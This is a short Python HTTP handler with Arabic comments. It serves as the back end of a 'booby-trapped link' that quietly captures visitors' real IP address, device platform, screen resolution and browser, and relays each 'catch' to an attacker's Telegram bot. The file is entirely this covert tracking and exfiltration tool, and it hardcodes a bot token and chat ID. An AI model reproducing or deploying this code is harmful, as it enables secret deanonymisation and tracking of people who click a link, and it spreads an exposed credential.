from http.server import BaseHTTPRequestHandler
import json
import requests

# معلوماتك اللي عطيتني إياها (جاهزة)
TOKEN = "8619490492:AAEfXC0wN0Uh73BA9TniEqyQh_gb_GyfzUg"
CHAT_ID = "5811700860"

class handler(BaseHTTPRequestHandler):
    def do_POST(self):
        try:
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data.decode('utf-8'))

            device = data.get('device', {})
            action_type = data.get('action', 'دخول صامت')

            # تنسيق الرسالة لتوصلك بشكل فخم في التليجرام
            message = (
                "⚠️ ** صيدة جديدة (رابط ملغم) ** ⚠️\n"
                "━━━━━━━━━━━━━━━\n"
                f"📝 **النوع:** {action_type}\n"
                f"🌐 **الـ IP الحقيقي:** `{device.get('ip', 'مخفي')}`\n"
                f"📱 **نوع الجهاز:** {device.get('platform', 'N/A')}\n"
                f"🖥 **دقة الشاشة:** {device.get('screen', 'N/A')}\n"
                f"🔍 **المتصفح:** {device.get('userAgent')[:50]}...\n"
                "━━━━━━━━━━━━━━━"
            )

            # إرسال البيانات فوراً للبوت
            requests.post(
                f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
                data={"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"}
            )

            # رد للسيرفر عشان ما يعلق
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"status": "success"}).encode())

        except Exception as e:
            self.send_response(500)
            self.end_headers()
